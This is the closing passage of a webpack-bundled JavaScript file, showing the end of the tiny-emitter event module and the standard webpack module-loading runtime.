    // Ref: https://github.com/scottcorgan/tiny-emitter/commit/c6ebfaa9bc973b33d110a84a307742b7cf94c953#commitcomment-5024910

    (liveEvents.length)
      ? e[name] = liveEvents
      : delete e[name];

    return this;
  }
};

module.exports = E;
module.exports.TinyEmitter = E;


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		if(__webpack_module_cache__[moduleId]) {
/******/ 			return __webpack_module_cache__[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/************************************************************************/
/******/ 	// module exports must be returned from runtime so entry inlining is disabled
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(686);
/******/ })()
.default;
});
}catch(e){}
})();

